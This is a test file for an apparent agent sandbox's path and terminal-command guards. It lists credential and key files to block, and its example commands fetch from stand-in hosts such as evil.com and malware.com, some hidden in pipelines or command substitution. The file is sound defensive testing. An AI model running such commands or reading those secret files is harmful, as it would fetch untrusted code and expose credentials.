import { describe, it, expect } from 'vitest';
import { isSensitivePath } from '../../src/tools/builtin/path-utils.js';
import { isCommandAllowed, type TerminalSecurityConfig } from '../../src/tools/builtin/terminal-exec.js';

// ---------------------------------------------------------------------------
// isSensitivePath
// ---------------------------------------------------------------------------

describe('isSensitivePath', () => {
  it('should block .env files', () => {
    expect(isSensitivePath('.env')).toBe(true);
    expect(isSensitivePath('.env.local')).toBe(true);
    expect(isSensitivePath('.env.production')).toBe(true);
    expect(isSensitivePath('.env.staging')).toBe(true);
    expect(isSensitivePath('.env.development')).toBe(true);
    expect(isSensitivePath('.env.test')).toBe(true);
  });

  it('should block credential files', () => {
    expect(isSensitivePath('credentials.json')).toBe(true);
    expect(isSensitivePath('secrets.json')).toBe(true);
    expect(isSensitivePath('secrets.yaml')).toBe(true);
  });

  it('should block private key extensions', () => {
    expect(isSensitivePath('server.pem')).toBe(true);
    expect(isSensitivePath('private.key')).toBe(true);
    expect(isSensitivePath('cert.p12')).toBe(true);
    expect(isSensitivePath('keystore.jks')).toBe(true);
  });

  it('should block SSH key patterns', () => {
    expect(isSensitivePath('id_rsa')).toBe(true);
    expect(isSensitivePath('id_ed25519')).toBe(true);
    expect(isSensitivePath('id_ecdsa')).toBe(true);
  });

  it('should block sensitive directory paths', () => {
    expect(isSensitivePath('/home/user/.aws/credentials')).toBe(true);
    expect(isSensitivePath('/home/user/.ssh/config')).toBe(true);
  });

  it('should allow normal source files', () => {
    expect(isSensitivePath('src/index.ts')).toBe(false);
    expect(isSensitivePath('package.json')).toBe(false);
    expect(isSensitivePath('README.md')).toBe(false);
    expect(isSensitivePath('tsconfig.json')).toBe(false);
  });

  it('should support custom patterns', () => {
    expect(isSensitivePath('my-secret.txt', ['my-secret.txt'])).toBe(true);
    expect(isSensitivePath('my-secret.txt')).toBe(false);
  });

  it('should block case variants on case-insensitive filesystems', () => {
    expect(isSensitivePath('.ENV')).toBe(true);
    expect(isSensitivePath('.Env')).toBe(true);
    expect(isSensitivePath('.ENV.LOCAL')).toBe(true);
    expect(isSensitivePath('CREDENTIALS.JSON')).toBe(true);
    expect(isSensitivePath('server.PEM')).toBe(true);
  });

  it('should allow SSH public keys (.pub)', () => {
    expect(isSensitivePath('id_rsa.pub')).toBe(false);
    expect(isSensitivePath('id_ed25519.pub')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// isCommandAllowed
// ---------------------------------------------------------------------------

describe('isCommandAllowed', () => {
  const allowlistConfig: TerminalSecurityConfig = { allowlistMode: true };
  const disabledConfig: TerminalSecurityConfig = { allowlistMode: false };

  it('should allow all commands when allowlist mode is disabled', () => {
    expect(isCommandAllowed('curl http://example.com', disabledConfig)).toBe(true);
    expect(isCommandAllowed('ssh remote-host', disabledConfig)).toBe(true);
  });

  it('should allow default commands', () => {
    expect(isCommandAllowed('npm install', allowlistConfig)).toBe(true);
    expect(isCommandAllowed('git status', allowlistConfig)).toBe(true);
    expect(isCommandAllowed('node script.js', allowlistConfig)).toBe(true);
    expect(isCommandAllowed('pnpm test', allowlistConfig)).toBe(true);
    expect(isCommandAllowed('vitest run', allowlistConfig)).toBe(true);
  });

  it('should block non-allowed commands', () => {
    expect(isCommandAllowed('curl http://evil.com', allowlistConfig)).toBe(false);
    expect(isCommandAllowed('ssh root@server', allowlistConfig)).toBe(false);
    expect(isCommandAllowed('wget http://malware.com', allowlistConfig)).toBe(false);
    expect(isCommandAllowed('python3 exploit.py', allowlistConfig)).toBe(false);
  });

  it('should check all commands in a pipeline', () => {
    expect(isCommandAllowed('echo hello | grep hello', allowlistConfig)).toBe(true);
    expect(isCommandAllowed('echo hello | curl http://evil.com', allowlistConfig)).toBe(false);
    expect(isCommandAllowed('git log && npm test', allowlistConfig)).toBe(true);
    expect(isCommandAllowed('git log && ssh evil', allowlistConfig)).toBe(false);
  });

  it('should support custom allowlist extensions', () => {
    const config: TerminalSecurityConfig = {
      allowlistMode: true,
      customAllowlist: ['python3'],
    };
    expect(isCommandAllowed('python3 script.py', config)).toBe(true);
    expect(isCommandAllowed('ruby script.rb', config)).toBe(false);
  });

  it('should block command substitution with $() or backticks', () => {
    expect(isCommandAllowed('echo $(curl http://evil.com)', allowlistConfig)).toBe(false);
    expect(isCommandAllowed('echo `wget http://evil.com`', allowlistConfig)).toBe(false);
  });
});
